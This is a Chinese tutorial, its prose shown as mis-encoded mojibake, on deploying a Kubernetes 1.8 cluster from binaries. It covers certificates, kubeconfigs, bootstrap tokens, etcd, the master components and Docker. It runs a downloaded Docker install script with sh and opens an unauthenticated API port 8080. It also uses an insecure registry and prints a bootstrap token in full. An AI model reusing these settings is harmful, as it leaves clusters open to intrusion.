nodeæœåŠ¡è¯ä¹¦(ä»…kube-proxy)kube-apiserveré¢„å®šä¹‰çš„RoleBinding system:node-proxier å°†User system:kube-proxyä¸Role system:node-proxierç»‘å®šï¼Œè¯¥Userå…·æœ‰è°ƒç”¨kube-apiserver Proxyç›¸å…³ APIçš„æƒé™(åé¢éƒ¨ç½²äº†å®¢æˆ·ç«¯å·¥å…·åæ–¹å¯æŸ¥çœ‹).å› æ­¤è¯ä¹¦é‡Œé¢é€šè¿‡CNæŒ‡å®šuserä¸º: system:kube-proxy, è¿™è¯¥è¯ä¹¦å°±æ˜¯å…·æœ‰äº†proxyç›¸åº”çš„æƒé™.12345678910111213141516171819cat &gt; kube-proxy-csr.json &lt;&lt;EOF&#123; "CN": "system:kube-proxy", "hosts": [], "key": &#123; "algo": "rsa", "size": 2048 &#125;, "names": [ &#123; "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" &#125; ]&#125;EOF ç”Ÿæˆè¯ä¹¦:123$ cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-proxy-csr.json | cfssljson -bare kube-proxy$ ls kube-proxy*kube-proxy.csr kube-proxy-csr.json kube-proxy-key.pem kube-proxy.pem åˆ†å‘è¯ä¹¦å°†ä¸Šé¢ç”Ÿæˆå¥½çš„è¯ä¹¦åˆ†å‘åˆ°masterå’ŒnodeèŠ‚ç‚¹, ä½œä¸ºkubernetesçš„é…ç½®æ–‡ä»¶:1234567891011# å› ä¸ºæˆ‘æ˜¯åœ¨masterä¸Šç”Ÿæˆçš„è¯ä¹¦, ä»…éœ€cpåˆ°masterå¯¹äºç›®å½•å³å¯$ mkdir -pv /etc/kubernetes/pkimkdir: å·²åˆ›å»ºç›®å½• "/etc/kubernetes"mkdir: å·²åˆ›å»ºç›®å½• "/etc/kubernetes/pki"$ cp ~/pki/&#123;admin-key.pem,admin.pem,ca-key.pem,ca.pem,kube-proxy-key.pem,kube-proxy.pem,kubernetes-key.pem,kubernetes.pem&#125; /etc/kubernetes/pki/$ ls /etc/kubernetes/pki/admin-key.pem ca-key.pem kube-proxy-key.pem kubernetes-key.pemadmin.pem ca.pem kube-proxy.pem kubernetes.pem# åœ¨nodeèŠ‚ç‚¹ä¸Šåˆ›å»ºç›®å½•, å¹¶ä¸”copyè¿‡å»$ ssh root@192.168.204.6 'mkdir -pv /etc/kubernetes/pki'$ scp ~/pki/&#123;admin-key.pem,admin.pem,ca-key.pem,ca.pem,kube-proxy-key.pem,kube-proxy.pem,kubernetes-key.pem,kubernetes.pem&#125; root@192.168.204.6:/etc/kubernetes/pki/ éƒ¨ç½²kuberneteså®¢æˆ·ç«¯å·¥å…·kubectlå®¢æˆ·ç«¯å·¥å…·éœ€è¦ä¸‹è½½: kubernetes-client-linux-amd64.tar.gz(1.8.7), ä½†æ˜¯ç”±äºå¢™çš„å­˜åœ¨, æœ‰äº›æ— æ³•ç¿»å¢™çš„æœ‹å‹è¯·è®¿é—®æˆ‘å·²ç»ä¸‹è½½å¥½çš„åœ°å€å›½å†…ä¸‹è½½è·å–åŒ…åè¿›è¡Œå®¢æˆ·ç«¯çš„å®‰è£…:12tar -xzvf kubernetes-client-linux-amd64.tar.gzcp kubernetes/client/bin/kube* /usr/bin/ å®¢æˆ·ç«¯å®‰è£…å®Œæˆå, éœ€è¦é…ç½®è®¿é—®å‡­è¯, è¿™é‡Œé…ç½®è¯ä¹¦è®¿é—®, è¯ä¹¦å°±æ˜¯ä¸Šé¢ç”Ÿæˆå¥½çš„adminçš„è¯ä¹¦1234567891011121314151617export KUBE_APISERVER="https://192.168.204.3:6443"# è®¾ç½®é›†ç¾¤å‚æ•°kubectl config set-cluster kubernetes \ --certificate-authority=/etc/kubernetes/pki/ca.pem \ --embed-certs=true \ --server=$&#123;KUBE_APISERVER&#125;# è®¾ç½®å®¢æˆ·ç«¯è®¤è¯å‚æ•°kubectl config set-credentials admin \ --client-certificate=/etc/kubernetes/pki/admin.pem \ --embed-certs=true \ --client-key=/etc/kubernetes/pki/admin-key.pem# è®¾ç½®ä¸Šä¸‹æ–‡å‚æ•°kubectl config set-context kubernetes \ --cluster=kubernetes \ --user=admin# è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡kubectl config use-context kubernetes ç”Ÿæˆçš„kubeconfigè¢«ä¿å­˜åˆ°~/.kube/configæ–‡ä»¶, è¯¥æ–‡ä»¶æ‹¥æœ‰å¯¹è¯¥é›†ç¾¤çš„æœ€é«˜æƒé™ï¼Œè¯·å¦¥å–„ä¿ç®¡ã€‚ç”±äºæˆ‘ä»¬é›†ç¾¤çš„masterèŠ‚ç‚¹è¿˜æ²¡æœ‰éƒ¨ç½², æ‰€ä»¥åé¢å†è¿›æµ‹è¯•ã€‚ nodeèŠ‚ç‚¹çš„TLSè¯ä¹¦å¼•å¯¼(TLS Bootstrap)é…ç½®å‡†å¤‡kubeletã€kube-proxyç­‰Nodeæœºå™¨ä¸Šçš„è¿›ç¨‹ä¸Masteræœºå™¨çš„kube-apiserverè¿›ç¨‹é€šä¿¡æ—¶éœ€è¦è®¤è¯å’Œæˆæƒ;kubernetes 1.4å¼€å§‹æ”¯æŒç”±kube-apiserverä¸ºå®¢æˆ·ç«¯ç”ŸæˆTLSè¯ä¹¦çš„TLS BootstrappingåŠŸèƒ½ï¼Œè¿™æ ·å°±ä¸éœ€è¦ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆè¯ä¹¦äº†; è¯¥åŠŸèƒ½å½“å‰ä»…æ”¯æŒä¸ºkubeletç”Ÿæˆè¯ä¹¦; åˆ›å»ºTLS Bootstrapping TokenBOOTSTRAP_TOKEN å°†è¢«å†™å…¥åˆ°kube-apiserverä½¿ç”¨çš„token.csvæ–‡ä»¶å’Œkubeletä½¿ç”¨çš„bootstrap.kubeconfigæ–‡ä»¶. 123456export BOOTSTRAP_TOKEN=$(head -c 16 /dev/urandom | od -An -t x | tr -d ' ')cat &gt; token.csv &lt;&lt;EOF$&#123;BOOTSTRAP_TOKEN&#125;,kubelet-bootstrap,10001,"system:kubelet-bootstrap"EOF$ cat token.csvfc9702212376b0c73ffc3db3d425227c,kubelet-bootstrap,10001,"system:kubelet-bootstrap" åˆ›å»ºkubelet bootstrapping kubeconfigæ–‡ä»¶1234567891011121314151617181920212223242526# é¦–å…ˆç¡®è®¤tokenç¯å¢ƒå˜é‡çš„å€¼echo $BOOTSTRAP_TOKEN# ç¡®ä¿KUBE_APISERVERè®¾ç½®æ­£ç¡®export KUBE_APISERVER="https://192.168.204.3:6443"# è®¾ç½®é›†ç¾¤å‚æ•°kubectl config set-cluster kubernetes \ --certificate-authority=/etc/kubernetes/pki/ca.pem \ --embed-certs=true \ --server=$&#123;KUBE_APISERVER&#125; \ --kubeconfig=bootstrap.kubeconfig# è®¾ç½®å®¢æˆ·ç«¯è®¤è¯å‚æ•°kubectl config set-credentials kubelet-bootstrap \ --token=$&#123;BOOTSTRAP_TOKEN&#125; \ --kubeconfig=bootstrap.kubeconfig# è®¾ç½®ä¸Šä¸‹æ–‡å‚æ•°kubectl config set-context default \ --cluster=kubernetes \ --user=kubelet-bootstrap \ --kubeconfig=bootstrap.kubeconfig# è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡kubectl config use-context default --kubeconfig=bootstrap.kubeconfig â€“embed-certs ä¸º true æ—¶è¡¨ç¤ºå°†certificate-authorityè¯ä¹¦å†™å…¥åˆ°ç”Ÿæˆçš„bootstrap.kubeconfigæ–‡ä»¶ä¸­; è®¾ç½®å®¢æˆ·ç«¯è®¤è¯å‚æ•°æ—¶æ²¡æœ‰æŒ‡å®šç§˜é’¥å’Œè¯ä¹¦ï¼Œåç»­ç”±kube-apiserverè‡ªåŠ¨ç”Ÿæˆï¼› åˆ›å»ºkube-proxy kubeconfigæ–‡ä»¶1234567891011121314151617181920export KUBE_APISERVER="https://192.168.204.3:6443"# è®¾ç½®é›†ç¾¤å‚æ•°kubectl config set-cluster kubernetes \ --certificate-authority=/etc/kubernetes/pki/ca.pem \ --embed-certs=true \ --server=$&#123;KUBE_APISERVER&#125; \ --kubeconfig=kube-proxy.kubeconfig# è®¾ç½®å®¢æˆ·ç«¯è®¤è¯å‚æ•°kubectl config set-credentials kube-proxy \ --client-certificate=/etc/kubernetes/pki/kube-proxy.pem \ --client-key=/etc/kubernetes/pki/kube-proxy-key.pem \ --embed-certs=true \ --kubeconfig=kube-proxy.kubeconfig# è®¾ç½®ä¸Šä¸‹æ–‡å‚æ•°kubectl config set-context default \ --cluster=kubernetes \ --user=kube-proxy \ --kubeconfig=kube-proxy.kubeconfig# è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡kubectl config use-context default --kubeconfig=kube-proxy.kubeconfig è®¾ç½®é›†ç¾¤å‚æ•°å’Œå®¢æˆ·ç«¯è®¤è¯å‚æ•°æ—¶ â€“embed-certs éƒ½ä¸º trueï¼Œè¿™ä¼šå°† certificate-authorityã€client-certificate å’Œ client-key æŒ‡å‘çš„è¯ä¹¦æ–‡ä»¶å†…å®¹å†™å…¥åˆ°ç”Ÿæˆçš„ kube-proxy.kubeconfig æ–‡ä»¶ä¸­ï¼› kube-proxy.pem è¯ä¹¦ä¸­ CN ä¸º system:kube-proxyï¼Œkube-apiserver é¢„å®šä¹‰çš„ RoleBinding cluster-admin å°†User system:kube-proxy ä¸ Role system:node-proxier ç»‘å®šï¼Œè¯¥ Role æˆäºˆäº†è°ƒç”¨ kube-apiserver Proxy ç›¸å…³ API çš„æƒé™ï¼› åˆ†å‘kubeconfigæ–‡ä»¶å…ˆç¡®è®¤æˆ‘ä»¬åˆšæ‰ç”Ÿæˆçš„æ–‡ä»¶, ç„¶åå°†token.csvå¤åˆ¶ç»™masterèŠ‚ç‚¹, bootstrap.kubeconfigå’Œkube-proxy.kubeconfigè´Ÿè´£ç»™nodeèŠ‚ç‚¹123456[root@k8s-apiserver01 TLS_Bootstrapping]# lsbootstrap.kubeconfig kube-proxy.kubeconfig token.csv# å› ä¸ºæˆ‘åœ¨masterèŠ‚ç‚¹ä¸Š(æ³¨æ„masteråŒæ—¶ä¹Ÿå……å½“nodeèŠ‚ç‚¹), æ‰€ä»¥$ cp token.csv /etc/kubernetes/$ cp ~/TLS_Bootstrapping/&#123;bootstrap.kubeconfig,kube-proxy.kubeconfig&#125; /etc/kubernetes$ scp ~/TLS_Bootstrapping/&#123;bootstrap.kubeconfig,kube-proxy.kubeconfig&#125; root@192.168.204.6:/etc/kubernetes/ éƒ¨ç½²ETCDetcdä½œä¸ºkubernetesé›†ç¾¤çš„ä¸»æ•°æ®åº“, åœ¨å®‰è£…kubernetesé›†ç¾¤ä¹‹å‰å¿…é¡»å…ˆå®‰è£…å’Œå¯åŠ¨ã€‚ä»etcdå®˜ç½‘ä¸‹è½½etcdçš„äºŒè¿›åˆ¶æ–‡ä»¶å‹ç¼©åŒ…, ç”±äºä¸ç¿»å¢™ä¸‹è½½é€Ÿåº¦ä¼šéå¸¸æ…¢, å› æ­¤æˆ‘å·²æå‰ä¸‹è½½åˆ°ç™¾åº¦ç½‘ç›˜ TLSè¯ä¹¦ç¡®è®¤éœ€è¦ä¸ºetcdé›†ç¾¤åˆ›å»ºåŠ å¯†é€šä¿¡çš„TLSè¯ä¹¦, ä¹‹å‰åˆ›å»ºçš„kubernetesè¯ä¹¦çš„hostså­—æ®µåˆ—è¡¨ä¸­åŒ…å«etcdéƒ¨ç½²åœ°å€çš„IP, å¦åˆ™åç»­è¯ä¹¦æ ¡éªŒä¼šå¤±è´¥;123[root@k8s-apiserver01 pki]# ls /etc/kubernetes/pki/admin-key.pem ca-key.pem kube-proxy-key.pem kubernetes-key.pemadmin.pem ca.pem kube-proxy.pem kubernetes.pem åœ¨éƒ¨ç½²TLS Etcdæ—¶æˆ‘ä»¬å°†è¦ä½¿ç”¨: ca.pem, kubernetes-key.pem, kubernetes.pem éƒ¨ç½²ä¸é…ç½®ETCDä»ä¸Šé¢çš„ç™¾åº¦ç½‘ç›˜ä¸‹è½½ä¸‹etcdçš„äºŒè¿›åˆ¶åŒ…, ç„¶åå¼€å§‹å®‰è£…:12$ tar vxf etcd-v3.2.7-linux-amd64.tar.gz$ cp etcd-v3.2.7-linux-amd64/etcd* /usr/local/bin/ å®‰è£…å®Œæˆåé…ç½®æˆsystemdçš„ç³»ç»ŸæœåŠ¡, ç”Ÿæˆ/usr/lib/systemd/system/etcd.serviceæ–‡ä»¶, æ–‡ä»¶å†…å®¹å¦‚ä¸‹:123456789101112131415161718192021222324252627282930313233[Unit]Description=Etcd ServerAfter=network.targetAfter=network-online.targetWants=network-online.targetDocumentation=https://github.com/coreos[Service]Type=notifyWorkingDirectory=/var/lib/etcd/EnvironmentFile=-/etc/etcd/etcd.confExecStart=/usr/local/bin/etcd \ --name $&#123;ETCD_NAME&#125; \ --cert-file=/etc/kubernetes/pki/kubernetes.pem \ --key-file=/etc/kubernetes/pki/kubernetes-key.pem \ --peer-cert-file=/etc/kubernetes/pki/kubernetes.pem \ --peer-key-file=/etc/kubernetes/pki/kubernetes-key.pem \ --trusted-ca-file=/etc/kubernetes/pki/ca.pem \ --peer-trusted-ca-file=/etc/kubernetes/pki/ca.pem \ --initial-advertise-peer-urls $&#123;ETCD_INITIAL_ADVERTISE_PEER_URLS&#125; \ --listen-peer-urls $&#123;ETCD_LISTEN_PEER_URLS&#125; \ --listen-client-urls $&#123;ETCD_LISTEN_CLIENT_URLS&#125;,http://127.0.0.1:2379 \ --advertise-client-urls $&#123;ETCD_ADVERTISE_CLIENT_URLS&#125; \ --initial-cluster-token $&#123;ETCD_INITIAL_CLUSTER_TOKEN&#125; \ --initial-cluster infra1=https://192.168.204.3:2380 \ --initial-cluster-state new \ --data-dir=$&#123;ETCD_DATA_DIR&#125;Restart=on-failureRestartSec=5LimitNOFILE=65536[Install]WantedBy=multi-user.target ç¼–å†™etcdæœåŠ¡çš„é…ç½®æ–‡ä»¶/etc/etcd/etcd.conf, æ–‡ä»¶å†…å®¹å¦‚ä¸‹:12345678910# [member]ETCD_NAME=infra1ETCD_DATA_DIR="/var/lib/etcd"ETCD_LISTEN_PEER_URLS="https://192.168.204.3:2380"ETCD_LISTEN_CLIENT_URLS="https://192.168.204.3:2379"#[cluster]ETCD_INITIAL_ADVERTISE_PEER_URLS="https://192.168.204.3:2380"ETCD_INITIAL_CLUSTER_TOKEN="etcd-cluster"ETCD_ADVERTISE_CLIENT_URLS="https://192.168.204.3:2379" å¯åŠ¨ETCD123456# å› ä¸ºåœ¨etcdçš„é…ç½®æ–‡ä»¶é‡Œé¢æˆ‘ä»¬æŒ‡å®šäº†etcdæ•°æ®ç›®å½•ä¸º: /var/lib/etcd, å› æ­¤æˆ‘ä»¬éœ€è¦æå‰å»ºå¥½$ mkdir /var/lib/etcdsystemctl daemon-reloadsystemctl enable etcdsystemctl start etcdsystemctl status etcd éªŒè¯ETCD1234567etcdctl \ --ca-file=/etc/kubernetes/pki/ca.pem \ --cert-file=/etc/kubernetes/pki/kubernetes.pem \ --key-file=/etc/kubernetes/pki/kubernetes-key.pem \ cluster-healthmember 74c10a33d24ef135 is healthy: got healthy result from https://192.168.204.3:2379cluster is health éƒ¨ç½²masterèŠ‚ç‚¹Masteræ˜¯Kubernetesçš„å¤§æ€»ç®¡ï¼Œä¸»è¦ç”±apiserverã€controller managerä¸schedulerç»„æˆ, ç”¨äºç®¡ç†æ‰€æœ‰node.ç›®å‰è¿™ä¸‰ä¸ªç»„ä»¶éœ€è¦éƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ä¸Š, æ³¨æ„åŒæ—¶åªèƒ½æœ‰ä¸€ä¸ªkube-schedulerã€kube-controller-managerè¿›ç¨‹å¤„äºå·¥ä½œçŠ¶æ€ï¼Œå¦‚æœè¿è¡Œå¤šä¸ªï¼Œåˆ™éœ€è¦é€šè¿‡é€‰ä¸¾äº§ç”Ÿä¸€ä¸ªleader ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„äºŒè¿›åˆ¶æ–‡ä»¶masterçš„æœåŠ¡éœ€è¦ä¸‹è½½: kubernetes-server-linux-amd64.tar.gz(1.8.7), ä½†æ˜¯ç”±äºå¢™çš„å­˜åœ¨, æœ‰äº›æ— æ³•ç¿»å¢™çš„æœ‹å‹è¯·è®¿é—®æˆ‘å·²ç»ä¸‹è½½å¥½çš„æ–‡ä»¶:å›½å†…ä¸‹è½½ ä¸‹è½½å®Œæˆå, å®‰è£…masteræœåŠ¡:123$ tar vxf kubernetes-server-linux-amd64.tar.gz$ cd kubernetes$ cp -r server/bin/&#123;kube-apiserver,kube-controller-manager,kube-scheduler,kubectl,kube-proxy,kubelet&#125; /usr/local/bin/ é…ç½®å’Œå¯åŠ¨kube-apiserverserviceé…ç½®æ–‡ä»¶/usr/lib/systemd/system/kube-apiserver.serviceå†…å®¹:1234567891011121314151617181920212223242526[Unit]Description=Kubernetes API ServiceDocumentation=https://github.com/GoogleCloudPlatform/kubernetesAfter=network.targetAfter=etcd.service[Service]EnvironmentFile=-/etc/kubernetes/configEnvironmentFile=-/etc/kubernetes/apiserverExecStart=/usr/local/bin/kube-apiserver \ $KUBE_LOGTOSTDERR \ $KUBE_LOG_LEVEL \ $KUBE_ETCD_SERVERS \ $KUBE_API_ADDRESS \ $KUBE_API_PORT \ $KUBELET_PORT \ $KUBE_ALLOW_PRIV \ $KUBE_SERVICE_ADDRESSES \ $KUBE_ADMISSION_CONTROL \ $KUBE_API_ARGSRestart=on-failureType=notifyLimitNOFILE=65536[Install]WantedBy=multi-user.target ç”±äºmasteræœåŠ¡: kube-apiserverã€kube-controller-managerã€kube-schedulerã€kubeletã€kube-proxyæœ‰ä¸€éƒ¨åˆ†ç›¸åŒçš„é…ç½®, å› æ­¤æŠ½ç¦»äº†1ä¸ªconfigæ¥å…¬ç”¨è¿™äº›é…ç½®: /etc/kubernetes/configæ–‡ä»¶çš„å†…å®¹ä¸º:12345678910111213141516171819202122#### kubernetes system config## The following values are used to configure various aspects of all# kubernetes services, including## kube-apiserver.service# kube-controller-manager.service# kube-scheduler.service# kubelet.service# kube-proxy.service# logging to stderr means we get it in the systemd journalKUBE_LOGTOSTDERR="--logtostderr=true"# journal message level, 0 is debugKUBE_LOG_LEVEL="--v=0"# Should this cluster be allowed to run privileged docker containersKUBE_ALLOW_PRIV="--allow-privileged=true"# How the controller-manager, scheduler, and proxy find the apiserverKUBE_MASTER="--master=http://192.168.204.3:8080" apiserveré…ç½®æ–‡ä»¶/etc/kubernetes/apiserverå†…å®¹ä¸º:123456789101112131415161718192021222324252627##### kubernetes system config#### The following values are used to configure the kube-apiserver##### The address on the local server to listen to.#KUBE_API_ADDRESS="--insecure-bind-address=sz-pg-oam-docker-test-001.tendcloud.com"KUBE_API_ADDRESS="--advertise-address=192.168.204.3 --bind-address=192.168.204.3 --insecure-bind-address=192.168.204.3"### The port on the local server to listen on.#KUBE_API_PORT="--port=8080"### Port minions listen on#KUBELET_PORT="--kubelet-port=10250"### Comma separated list of nodes in the etcd clusterKUBE_ETCD_SERVERS="--etcd-servers=https://192.168.204.3:2379"### Address range to use for servicesKUBE_SERVICE_ADDRESSES="--service-cluster-ip-range=10.254.0.0/16"### default admission control policiesKUBE_ADMISSION_CONTROL="--admission-control=ServiceAccount,NamespaceLifecycle,NamespaceExists,LimitRanger,ResourceQuota"### Add your own!KUBE_API_ARGS="--authorization-mode=Node,RBAC --runtime-config=rbac.authorization.k8s.io/v1beta1 --kubelet-https=true --experimental-bootstrap-token-auth --token-auth-file=/etc/kubernetes/token.csv --service-node-port-range=30000-32767 --tls-cert-file=/etc/kubernetes/pki/kubernetes.pem --tls-private-key-file=/etc/kubernetes/pki/kubernetes-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --service-account-key-file=/etc/kubernetes/pki/ca-key.pem --etcd-cafile=/etc/kubernetes/pki/ca.pem --etcd-certfile=/etc/kubernetes/pki/kubernetes.pem --etcd-keyfile=/etc/kubernetes/pki/kubernetes-key.pem --enable-swagger-ui=true --apiserver-count=3 --audit-log-maxage=30 --audit-log-maxbackup=3 --audit-log-maxsize=100 --audit-log-path=/var/lib/audit.log --event-ttl=1h" å¯åŠ¨kube-apiserver1234567$ systemctl daemon-reload$ systemctl enable kube-apiserver$ systemctl start kube-apiserver$ systemctl status kube-apiserver$ netstat -tlnup | grep kubetcp 0 0 192.168.204.3:6443 0.0.0.0:* LISTEN 10625/kube-apiservetcp 0 0 192.168.204.3:8080 0.0.0.0:* LISTEN 10625/kube-apiserve é…ç½®å’Œå¯åŠ¨kube-controller-manageråˆ›å»ºkube-controller-managerçš„serivceé…ç½®æ–‡ä»¶: /usr/lib/systemd/system/kube-controller-manager.service, å†…å®¹å¦‚ä¸‹:1234567891011121314151617[Unit]Description=Kubernetes Controller ManagerDocumentation=https://github.com/GoogleCloudPlatform/kubernetes[Service]EnvironmentFile=-/etc/kubernetes/configEnvironmentFile=-/etc/kubernetes/controller-managerExecStart=/usr/local/bin/kube-controller-manager \ $KUBE_LOGTOSTDERR \ $KUBE_LOG_LEVEL \ $KUBE_MASTER \ $KUBE_CONTROLLER_MANAGER_ARGSRestart=on-failureLimitNOFILE=65536[Install]WantedBy=multi-user.target é…ç½®æ–‡ä»¶/etc/kubernetes/controller-managerå†…å®¹å¦‚ä¸‹:1234567#### The following values are used to configure the kubernetes controller-manager# defaults from config and apiserver should be adequate# Add your own!KUBE_CONTROLLER_MANAGER_ARGS="--address=127.0.0.1 --service-cluster-ip-range=10.254.0.0/16 --cluster-name=kubernetes --cluster-signing-cert-file=/etc/kubernetes/pki/ca.pem --cluster-signing-key-file=/etc/kubernetes/pki/ca-key.pem --service-account-private-key-file=/etc/kubernetes/pki/ca-key.pem --root-ca-file=/etc/kubernetes/pki/ca.pem --leader-elect=true" å¯åŠ¨æœåŠ¡:12345$ systemctl daemon-reload$ systemctl enable kube-controller-manager$ systemctl start kube-controller-manager$ netstat -tlnup | grep controlltcp 0 0 127.0.0.1:10252 0.0.0.0:* LISTEN 10692/kube-controll é…ç½®å’Œå¯åŠ¨kube-scheduleråˆ›å»ºkube-schedulerçš„serivceé…ç½®æ–‡ä»¶/usr/lib/systemd/system/kube-scheduler.service:1234567891011121314151617[Unit]Description=Kubernetes Scheduler PluginDocumentation=https://github.com/GoogleCloudPlatform/kubernetes[Service]EnvironmentFile=-/etc/kubernetes/configEnvironmentFile=-/etc/kubernetes/schedulerExecStart=/usr/local/bin/kube-scheduler \ $KUBE_LOGTOSTDERR \ $KUBE_LOG_LEVEL \ $KUBE_MASTER \ $KUBE_SCHEDULER_ARGSRestart=on-failureLimitNOFILE=65536[Install]WantedBy=multi-user.target é…ç½®æ–‡ä»¶/etc/kubernetes/scheduler:1234567#### kubernetes scheduler config# default config should be adequate# Add your own!KUBE_SCHEDULER_ARGS="--leader-elect=true --address=127.0.0.1" å¯åŠ¨æœåŠ¡:12345$ systemctl daemon-reload$ systemctl enable kube-scheduler$ systemctl start kube-scheduler$ netstat -tlnup | grep scheduletcp 0 0 127.0.0.1:10251 0.0.0.0:* LISTEN 10745/kube-schedule éªŒè¯masterèŠ‚ç‚¹åŠŸèƒ½12345678910$ netstat -tlnup | grep kubetcp 0 0 127.0.0.1:10251 0.0.0.0:* LISTEN 10745/kube-scheduletcp 0 0 192.168.204.3:6443 0.0.0.0:* LISTEN 10625/kube-apiservetcp 0 0 127.0.0.1:10252 0.0.0.0:* LISTEN 10692/kube-controlltcp 0 0 192.168.204.3:8080 0.0.0.0:* LISTEN 10625/kube-apiserve$ kubectl get componentstatusesNAME STATUS MESSAGE ERRORscheduler Healthy okcontroller-manager Healthy oketcd-0 Healthy &#123;"health": "true"&#125; masterå®‰è£…å®Œæˆå, æˆ‘ä»¬å°±å¯ä»¥é¢æµ‹è¯•kubectläº†, æŸ¥çœ‹ä¸Šé¢æåˆ°çš„clusterrolebindingçš„ç›¸å…³æƒé™:123456789101112131415161718192021222324252627282930313233343536373839404142$ kubectl get clusterrolebinding system:node-proxier -o yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: annotations: rbac.authorization.kubernetes.io/autoupdate: "true" creationTimestamp: 2018-01-19T01:23:53Z labels: kubernetes.io/bootstrapping: rbac-defaults name: system:node-proxier resourceVersion: "75" selfLink: /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/system%3Anode-proxier uid: 6916e382-fcb7-11e7-ad2d-fa163e1ab5c5roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:node-proxiersubjects:- apiGroup: rbac.authorization.k8s.io kind: User name: system:kube-proxy$ kubectl get clusterrolebinding cluster-admin -o yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: annotations: rbac.authorization.kubernetes.io/autoupdate: "true" creationTimestamp: 2018-01-19T01:23:52Z labels: kubernetes.io/bootstrapping: rbac-defaults name: cluster-admin resourceVersion: "72" selfLink: /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/cluster-admin uid: 69072637-fcb7-11e7-ad2d-fa163e1ab5c5roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- apiGroup: rbac.authorization.k8s.io kind: Group name: system:masters éƒ¨ç½²nodeèŠ‚ç‚¹Nodeæ˜¯ä¸»è¦æ‰§è¡Œå®¹å™¨å®ä¾‹çš„èŠ‚ç‚¹ï¼Œå¯è§†ä¸ºå·¥ä½œèŠ‚ç‚¹ã€‚ä»–è´Ÿè´£å®¹å™¨çš„å¯åœã€‚æ³¨æ„: å› ä¸ºkubernetes CNIæ ‡å‡†çš„æ¨å‡º, å®¹å™¨çš„ç½‘ç»œåé¢ä¼šé€šè¿‡CNIæ’ä»¶å•ç‹¬éƒ¨ç½², æ‰€ä»¥æ­¤æ—¶çš„nodeèŠ‚ç‚¹åˆ›å»ºå‡ºæ¥çš„å®¹å™¨æ˜¯ä¸èƒ½å¤¸ä¸»æœºé€šä¿¡çš„.Kubernetes nodeèŠ‚ç‚¹åŒ…å«å¦‚ä¸‹ç»„ä»¶ï¼š Docker: criçš„å®ç°, dockerçš„å®‰è£…å¾ˆç®€å•ã€‚ kubelet: è´Ÿè´£ç»´æŒå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†, é€šè¿‡äºŒè¿›åˆ¶å®‰è£… kube-proxy: è´Ÿè´£ä¸ºServiceæä¾›clusterå†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡, é€šè¿‡äºŒè¿›åˆ¶å®‰è£… è¯ä¹¦ä¸Bootstrap TLSé…ç½®æ–‡ä»¶ç¡®è®¤å¦‚æœè¯¥nodeèŠ‚ç‚¹å·²ç»åˆ†å‘äº†è¯ä¹¦, å¯ä»¥çœ‹åˆ°å¦‚ä¸‹:123[root@k8s-node01 kubernetes]# ls /etc/kubernetes/pkiadmin-key.pem ca-key.pem kubelet-client.crt kubelet.crt kube-proxy-key.pem kubernetes-key.pemadmin.pem ca.pem kubelet-client.key kubelet.key kube-proxy.pem kubernetes.pem å¦‚æœæ²¡åˆ†å‘è¯ä¹¦, åˆ°masterèŠ‚ç‚¹å°†ç›¸åº”çš„è¯ä¹¦copyè¿‡å»123mkdir -pv /etc/kubernetes/pkiscp root@192.168.204.3:~/pki/&#123;admin-key.pem,admin.pem,ca-key.pem,ca.pem,kube-proxy-key.pem,kube-proxy.pem,kubernetes-key.pem,kubernetes.pem&#125; /etc/kubernetes/pki/scp root@192.168.204.3:~/TLS_Bootstrapping/&#123;bootstrap.kubeconfig,kube-proxy.kubeconfig&#125; /etc/kubernetes/ éƒ¨ç½²docker12curl -fsSL "https://get.docker.com/" &gt; docker_install.shsh docker_install.sh --mirror Aliyun åŒæ—¶ä¸ºäº†åŠ é€Ÿdockerå®˜æ–¹é•œåƒçš„ä¸‹è½½é€Ÿåº¦, é…ç½®åŠ é€Ÿå™¨(å› ä¸ºç§æœ‰ä»“åº“æ²¡æœ‰ä½¿ç”¨https, å› æ­¤è¿™é‡ŒåŒæ—¶å°†ç§æœ‰ä»“åº“åœ°å€ä¹ŸåŠ ä¸Š):12345678# æ³¨æ„ç”±äºè‡ªå·±æ­å»ºçš„ç§æœ‰ä»“åº“æ²¡æœ‰ä½¿ç”¨SSL, å¦‚æœä½ ä¹Ÿæ˜¯è¯·å°†192.168.204.15æ¢æˆä½ è‡ªå·±çš„ä»“åº“åœ°å€mkdir -p /etc/dockertee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; "registry-mirrors": ["https://v5d7kh0f.mirror.aliyuncs.com"], "insecure-registries": ["192.168.204.15"]&#125;EOF ç„¶åé‡å¯docker:12systemctl restart dockersystemctl status docker ä¸‹è½½æœ€æ–°çš„nodeèŠ‚ç‚¹çš„äºŒè¿›åˆ¶åŒ…nodeèŠ‚ç‚¹çš„äºŒè¿›åˆ¶åŒ…: kubernetes-node-linux-amd64.tar.gz, å·²ä¸‹è½½åˆ°æˆ‘ä»¬ç™¾åº¦äº‘ç›˜: å›½å†…ä¸‹è½½12tar vxf kubernetes-node-linux-amd64.tar.gzcd kubernetes &amp;&amp; cp ./node/bin/&#123;kube-proxy,kubelet&#125; /usr/local/bin/ éƒ¨ç½²kubeletåˆ›å»ºkubeletçš„serviceé…ç½®æ–‡ä»¶:/usr/lib/systemd/system/kubelet.service12345678910111213141516171819202122[Unit]Description=Kubernetes Kubelet 